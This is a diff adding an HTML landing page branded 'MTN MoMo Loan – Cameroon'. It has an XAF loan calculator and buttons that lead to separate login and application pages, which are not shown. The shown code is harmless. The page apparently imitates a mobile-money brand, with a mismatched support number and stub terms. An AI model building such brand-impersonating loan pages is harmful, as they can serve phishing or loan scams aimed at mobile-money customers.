@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan – Cameroon</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            overflow-x: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .menu-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            position: absolute;
+            left: 20px;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* MoMo icon centered at top */
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 8px 18px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        /* ===== CALCULATOR ===== */
+        .calc-section {
+            background: #f8f9ff;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: left;
+        }
+
+        .calc-title {
+            font-size: 17px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #1a1a2e;
+        }
+
+        .calc-title .emoji {
+            margin-right: 6px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .input-label { color: #333; }
+        .input-value { color: #0047AB; font-weight: 700; }
+
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 3px;
+            background: #e0e0e0;
+            outline: none;
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0047AB;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,71,171,0.3);
+        }
+
+        .slider::-moz-range-thumb {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0047AB;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 2px 8px rgba(0,71,171,0.3);
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #999;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .payment-box {
+            background: #FFCC00;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .payment-label {
+            display: block;
+            color: #1a1a2e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .payment-amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: #1a1a2e;
+        }
+
+        /* ===== APPLY BUTTON ===== */
+        .apply-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+        }
+
+        .apply-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0,71,171,0.3);
+        }
+
+        .apply-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* ===== FEATURES ===== */
+        .features {
+            display: flex;
+            justify-content: space-around;
+            gap: 10px;
+        }
+
+        .feature {
+            text-align: center;
+            color: #777;
+            font-size: 12px;
+            flex: 1;
+        }
+
+        .feature-icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .feature strong {
+            color: #1a1a2e;
+        }
+
+        /* ===== BOTTOM NAV ===== */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            border-radius: 16px;
+            padding: 12px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .nav-item {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            transition: color 0.2s;
+        }
+
+        .nav-item.active { color: #0047AB; font-weight: 600; }
+        .nav-item .icon { font-size: 22px; display: block; }
+
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+        }
+
+        footer a {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .card { padding: 20px 16px; }
+            .features { flex-wrap: wrap; }
+            .feature { flex: 1 0 80px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== HEADER with centered MoMo icon (Login removed) ===== -->
+    <header>
+        <button class="menu-btn" aria-label="Menu">☰</button>
+        <div class="logo-container">
+            <div class="logo">
+                <span class="momo-icon">MoMo</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== MAIN CARD ===== -->
+    <div class="card">
+        <!-- Loan Calculator (Cameroon – XAF) -->
+        <div class="calc-section">
+            <h2 class="calc-title">
+                <span class="emoji">📊</span> Loan Calculator (XAF)
+            </h2>
+
+            <!-- Loan Amount (XAF) -->
+            <div class="input-group">
+                <div class="input-header">
+                    <span class="input-label">Loan Amount (XAF)</span>
+                    <span class="input-value" id="amountValue">XAF 500,000</span>
+                </div>
+                <input type="range" class="slider" min="50000" max="1000000" step="10000" value="500000" id="amountSlider">
+                <div class="range-labels">
+                    <span>XAF 50,000</span>
+                    <span>XAF 1,000,000</span>
+                </div>
+            </div>
+
+            <!-- Loan Term -->
+            <div class="input-group">
+                <div class="input-header">
+                    <span class="input-label">Loan Term</span>
+                    <span class="input-value" id="termValue">12 months</span>
+                </div>
+                <input type="range" class="slider" min="3" max="24" step="3" value="12" id="termSlider">
+                <div class="range-labels">
+                    <span>3 months</span>
+                    <span>24 months</span>
+                </div>
+            </div>
+
+            <!-- Monthly Payment -->
+            <div class="payment-box">
+                <span class="payment-label">📅 Monthly Payment</span>
+                <span class="payment-amount" id="paymentAmount">XAF 43,958.33</span>
+            </div>
+        </div>
+
+        <button class="apply-btn" id="applyBtn">💰 APPLY FOR LOAN</button>
+    </div>
+
+    <!-- ===== FEATURES ===== -->
+    <div class="card" style="padding: 20px;">
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">⚡</span>
+                Instant<br><strong>Approval</strong>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">📱</span>
+                Easy<br><strong>MoMo Repayment</strong>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">🔒</span>
+                Secure<br><strong>Bank-level</strong>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== BOTTOM NAV ===== -->
+    <div class="bottom-nav">
+        <button class="nav-item active">
+            <span class="icon">🏠</span>
+            Home
+        </button>
+        <button class="nav-item" onclick="window.location.href='application.html'">
+            <span class="icon">💰</span>
+            Apply
+        </button>
+        <button class="nav-item" onclick="window.location.href='login.html'">
+            <span class="icon">🔐</span>
+            Login
+        </button>
+    </div>
+
+    <footer>
+        © 2026 MTN MoMo Cameroon •
+        <a href="#" onclick="alert('Call 0244-300000 for support')">Help</a> •
+        <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
+    </footer>
+
+    <script>
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const amountSlider = document.getElementById('amountSlider');
+        const termSlider = document.getElementById('termSlider');
+        const amountValue = document.getElementById('amountValue');
+        const termValue = document.getElementById('termValue');
+        const paymentAmount = document.getElementById('paymentAmount');
+        const applyBtn = document.getElementById('applyBtn');
+
+        // ============================================
+        // UPDATE CALCULATOR (Cameroon XAF, 10% APR)
+        // ============================================
+        function updateCalculator() {
+            const amount = parseFloat(amountSlider.value);
+            const months = parseFloat(termSlider.value);
+
+            amountValue.textContent = 'XAF ' + amount.toLocaleString('en-US');
+            termValue.textContent = months + (months === 1 ? ' month' : ' months');
+
+            const annualRate = 0.10;
+            const monthlyRate = annualRate / 12;
+            const power = Math.pow(1 + monthlyRate, months);
+            const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
+
+            paymentAmount.textContent = 'XAF ' + monthlyPayment.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        updateCalculator();
+        amountSlider.addEventListener('input', updateCalculator);
+        termSlider.addEventListener('input', updateCalculator);
+
+        // ============================================
+        // APPLY BUTTON
+        // ============================================
+        applyBtn.addEventListener('click', function() {
+            localStorage.setItem('loanAmount', amountSlider.value);
+            localStorage.setItem('loanTerm', termSlider.value);
+            localStorage.setItem('loanRepayment', paymentAmount.textContent);
+            window.location.href = 'application.html';
+        });
+
+        console.log('====================================');
+        console.log('💰 MTN MoMo Loan – Cameroon');
+        console.log('📊 Loan Calculator Active (XAF)');
+        console.log('====================================');
+    </script>
+
+</body>
+</html>
